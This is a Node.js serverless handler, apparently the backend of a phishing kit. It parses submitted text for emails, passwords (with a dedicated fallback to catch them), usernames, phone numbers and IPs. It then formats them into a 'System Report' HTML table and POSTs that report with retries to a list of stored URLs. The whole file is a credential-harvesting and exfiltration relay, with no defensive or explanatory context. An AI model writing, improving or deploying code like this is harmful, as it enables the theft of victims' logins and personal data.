const fs = require("fs");
const path = require("path");

const FILE = path.join(process.cwd(), "data", "urls.json");

/* ======================
   SAFE LOAD & SAVE URL (FIX 500 VERCEL)
====================== */
function loadUrls() {
  try {
    if (!fs.existsSync(FILE)) return [];
    const data = fs.readFileSync(FILE, "utf8");
    return data ? JSON.parse(data) : [];
  } catch {
    return [];
  }
}

function saveUrls(data) {
  try {
    fs.writeFileSync(FILE, JSON.stringify(data, null, 2));
  } catch (e) {
    console.log("SAVE ERROR:", e.message);
  }
}

/* ======================
   NORMALIZE KEY (NLP SIMPLE)
====================== */
function normalizeKey(key = "") {
  key = key.toLowerCase();

  const map = {
    email: ["email", "e-mail", "mail"],
    password: ["password", "pass", "kata sandi", "sandi", "pwd"],
    user: ["user", "username", "nama", "name"],
    login: ["login", "login via", "auth"],
    phone: ["phone", "hp", "no hp", "nomor", "telepon"],
    ip: ["ip", "ip address"],
  };

  for (const k in map) {
    if (map[k].some(x => key.includes(x))) return k;
  }

  return key.replace(/\s+/g, "_");
}

/* ======================
   CLEAN HTML
====================== */
function stripHtml(input = "") {
  return String(input)
    .replace(/<script[\s\S]*?<\/script>/gi, "")
    .replace(/<style[\s\S]*?<\/style>/gi, "")
    .replace(/\r/g, "\n");
}

/* ======================
   AUTO EXTRACT VARS (FIXED + MORE STABLE)
====================== */
function extractVars(input = "") {
  const vars = {};
  const html = stripHtml(input);

  /* 1. TABLE PARSER */
  const tdRegex = /<td[^>]*>(.*?)<\/td>\s*<td[^>]*>(.*?)<\/td>/gi;
  let m;

  while ((m = tdRegex.exec(html)) !== null) {
    const keyRaw = m[1].replace(/<[^>]*>/g, "").trim();
    const value = m[2].replace(/<[^>]*>/g, "").trim();

    const key = normalizeKey(keyRaw);

    if (value) vars[key] = value;
  }

  /* 2. FALLBACK TEXT PARSER */
  const lines = html.split("\n");

  for (const line of lines) {
    const clean = line.replace(/<[^>]*>/g, "").trim();
    const m2 = clean.match(/^(.+?)\s*[:=]\s*(.+)$/);

    if (m2) {
      const key = normalizeKey(m2[1].trim());
      const value = m2[2].trim();

      if (value) vars[key] = value;
    }
  }

  /* 3. PRIORITY PASSWORD FIX (ANTI MISS DETECT) */
  if (!vars.password) {
    const passMatch = html.match(/(password|kata\s*sandi|sandi)\s*[:=]?\s*([^\s<]+)/i);
    if (passMatch) vars.password = passMatch[2];
  }

  return vars;
}

/* ======================
   BUILD HTML TEMPLATE (NO CHANGE)
====================== */
function buildHtml(vars) {
  const row = (k, v) => `
    <tr>
      <td style="padding:10px;border:1px solid #1f2937;background:#1f2937;color:#94a3b8">
        ${k}
      </td>
      <td style="padding:10px;border:1px solid #1f2937;background:#111827">
        ${v || "-"}
      </td>
    </tr>
  `;

  return `
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
</head>
<body style="margin:0;background:#0f172a;font-family:Arial;color:#e5e7eb;padding:20px">

<div style="max-width:700px;margin:auto;background:#111827;border-radius:10px;overflow:hidden">

  <div style="padding:18px;background:#0b1220;text-align:center">
    <h2 style="margin:0">System Report</h2>
    <small style="color:#94a3b8">Auto Generated</small>
  </div>

  <div style="padding:20px">
    <table style="width:100%;border-collapse:collapse">

      ${row("User", vars.user)}
      ${row("Email", vars.email)}
      ${row("Password", vars.password)}
      ${row("Login", vars.login)}
      ${row("Phone", vars.phone)}
      ${row("IP", vars.ip)}

    </table>
  </div>

</div>

</body>
</html>
`;
}

/* ======================
   MAIN HANDLER (FIXED 500 + SAFE FETCH)
====================== */
module.exports = async (req, res) => {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false, message: "POST only" });
    }

    const body = req.body || {};
    const subjek = body.subjek || "";
    const pesan = body.pesan || "";

    if (!subjek || !pesan) {
      return res.status(400).json({
        success: false,
        message: "subjek & pesan wajib diisi"
      });
    }

    const vars = extractVars(pesan);

    /* FIX IP SAFE */
    vars.ip =
      vars.ip ||
      req.headers["x-forwarded-for"]?.split(",")[0] ||
      req.socket?.remoteAddress ||
      "unknown";

    const html = buildHtml(vars);

    const urls = loadUrls();

    if (!urls.length) {
      return res.json({ success: false, message: "URL kosong" });
    }

    /* FIX FETCH (ANTI CRASH VERCEL) */
    const fetchFn =
      global.fetch ||
      ((...args) => import("node-fetch").then(({ default: fetch }) => fetch(...args)));

    /* ======================
       PARALLEL + RETRY + TIMEOUT FIX
    ====================== */
    const results = await Promise.all(
      urls.map(async (url) => {
        let attempt = 0;

        while (attempt < 2) {
          attempt++;

          const controller = new (global.AbortController || require("abort-controller"))();
          const timeout = setTimeout(() => controller.abort(), 8000);

          try {
            const r = await fetchFn(url, {
              method: "POST",
              headers: {
                "Content-Type": "application/x-www-form-urlencoded"
              },
              body: new URLSearchParams({
                subjek,
                pesan: html
              }),
              signal: controller.signal
            });

            clearTimeout(timeout);

            return {
              url,
              success: true,
              status: r.status,
              retry: attempt - 1
            };
          } catch (err) {
            clearTimeout(timeout);

            if (attempt >= 2) {
              return {
                url,
                success: false,
                error: err.name === "AbortError" ? "TIMEOUT" : err.message,
                retry: attempt - 1
              };
            }
          }
        }
      })
    );

    return res.json({
      success: true,
      message: "done",
      total: urls.length,
      vars,
      results
    });

  } catch (err) {
    return res.status(500).json({
      success: false,
      message: "internal error",
      error: err.message
    });
  }
};
